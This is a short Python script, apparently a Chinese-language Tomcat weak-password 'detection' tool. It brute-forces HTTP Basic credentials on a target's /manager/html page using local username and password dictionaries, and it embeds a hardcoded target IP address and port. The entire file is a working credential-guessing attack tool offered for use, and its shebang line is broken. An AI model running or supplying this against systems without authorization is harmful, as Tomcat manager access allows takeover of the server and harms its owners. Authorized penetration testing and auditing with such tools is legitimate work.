#!/user/bin/
# -*- coding:UTF-8 -*-
# Author:Master先生

import sys
import requests
import base64

url = "http://123.58.236.76:48283/"  + '/manager/html'

help ="""
 ___                                                  ___      
(   )                                                (   )     
 | |_       .--.    ___ .-. .-.     .--.      .---.   | |_     
(   __)    /    \  (   )   '   \   /    \    / .-, \ (   __)   
 | |      |  .-. ;  |  .-.  .-. ; |  .-. ;  (__) ; |  | |      
 | | ___  | |  | |  | |  | |  | | |  |(___)   .'`  |  | | ___  
 | |(   ) | |  | |  | |  | |  | | |  |       / .'| |  | |(   ) 
 | | | |  | |  | |  | |  | |  | | |  | ___  | /  | |  | | | |  
 | ' | |  | '  | |  | |  | |  | | |  '(   ) ; |  ; |  | ' | |  
 ' `-' ;  '  `-' /  | |  | |  | | '  `-' |  ' `-'  |  ' `-' ;  
  `.__.    `.__.'  (___)(___)(___) `.__,'   `.__.'_.   `.__.   
                                    by:Master先生    
    
Options:
     -h     Show basic help message and exit
     -u     Target URL (e.g. "http://110.110.110.110:8080/")                                            
"""

def inpt_all():
    inp = sys.argv
    if 0 < len(inp) <= 1:
        print("*" * 45)
        print('Tomcat弱口令检测工具\nOptions:\n    Usage: Python  tomcat_weak_password.py -h')
        print("*" * 45)
    elif '-h' in inp:
        print(help)
    elif '-u' in inp:
        ind = inp.index('-u')
        inp_url = inp[ind + 1]
        intruder(inp_url + '/manager/html')
    else:
        print('请重新检查输入！')


def intruder(url):
    # 本地用户名文件下，和本脚本文件在同一目录下
    uesrs = open("./dict/user.txt", "r").readlines()
    # 本地密码文件，和本脚本文件在同一目录下
    passwds = open("./dict/pass.txt", "r").readlines()
    for usr in uesrs:
        for pas in passwds:
            print('正在测试','账号:', usr.strip(), '密码:', pas.strip(),'...')
            tomcat_password = usr.strip() + ':' + pas.strip()
            tomcat_password_encode = base64.b64encode(tomcat_password.encode('utf-8'))
            tomcat_password_encode_end = 'Basic ' + str(tomcat_password_encode, 'utf-8')  # 输出成字符串格式
            headers = {
                'Authorization': tomcat_password_encode_end,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0'}
            res = requests.get(url, headers=headers)
            if res.status_code == 200:
                print("*" *45)
                print("弱口令检测成功！")
                print(' username:', usr,'\n','password:', pas)
                print("*" *45)
                break

inpt_all()

